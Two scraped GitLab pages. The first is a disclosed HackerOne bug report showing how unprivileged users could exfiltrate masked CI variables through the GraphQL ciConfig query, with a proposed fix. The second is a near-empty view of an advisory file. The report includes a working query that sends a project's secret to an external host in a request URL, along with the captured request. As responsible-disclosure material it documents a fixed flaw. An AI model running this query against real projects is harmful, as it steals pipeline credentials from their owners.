=== Content from gitlab.com_af45933a_20250108_115059.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Backend: Unallowed users can read masked CI variables of Gitlab projects

**[HackerOne report #1511133](https://hackerone.com/reports/1511133)** by `shells3c` on 2022-03-14, assigned to [@dcouture](/dcouture "Dominic Couture"):

[Report](#report) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

External users/users without privilege/guests (depends on project visibility) can access CI variables of a Gitlab project using GraphQL. The table below explains all situations that a user can access CI variables:

| Project visibility | Public Project | Internal Project | Private Project |
| --- | --- | --- | --- |
| External user | Yes | No | No |
| User | Yes | Yes | No |
| Guest | Yes | Yes | Yes |

##### Steps to reproduce

1. Create a project, then create a masked CI variable in the project name `PASSWORD`, disable **Protect variable** and enable **Mask variable**
2. From another account (no role in the project), run the following query in the GraphQL Explorer

```
{
  ciConfig(
    projectPath: "dcouture/public_project"
    content: "include: https://[redacted]/$VARIABLE_NAME.yaml"
  ) {
    errors
  }
}
```

3. The server at `example.com` will receive the following request

```
GET /[YOUR PASSWORD HERE].yaml HTTP/1.0
Host: [redacted]
Connection: close
Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
Accept: */*
User-Agent: Ruby
```

##### What is the current *bug* behavior?

GraphQL operation `getCiConfigData` loads all CI variables of the project including custom ones in the background

##### What is the expected *correct* behavior?

GraphQL operation `getCiConfigData` shouldn't be able to access project's custom variables

##### Output of checks

This bug happens on GitLab.com

#### Impact

Accessing CI variables, including sensitive masked variables of Gitlab projects without permission

## Proposal

Update `Resolvers::Ci::ConfigResolver` to authorize using the `create_pipeline` policy.

Edited Jun 07, 2022 by [Avielle Wolfe](/avielle)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_09955ae4_20250108_115058.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2022](/gitlab-org/cves/-/tree/master/2022)
* [**CVE-2022-2229.json**](/gitlab-org/cves/-/blob/master/2022/CVE-2022-2229.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2022/CVE-2022-2229.json)
[Permalink](/gitlab-org/cves/-/blob/c6a6f86828227186d5080abce4d5f88d42571ec9/2022/CVE-2022-2229.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ GitLab Bot 's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 " GitLab Bot ")](/gitlab-bot)

  Jul 01, 2022

  [e70bf347](/gitlab-org/cves/-/commit/e70bf347fe8fd1a8335503a571b9534b73abad50)
  [Publishing 0 updated advisories and 2 new advisories](/gitlab-org/cves/-/commit/e70bf347fe8fd1a8335503a571b9534b73abad50)
  繚
  e70bf347

  [ GitLab Bot ](/gitlab-bot) authored Jul 01, 2022

  e70bf347

  [Publishing 0 updated advisories and 2 new advisories](/gitlab-org/cves/-/commit/e70bf347fe8fd1a8335503a571b9534b73abad50)
  [ GitLab Bot ](/gitlab-bot) authored Jul 01, 2022

Loading


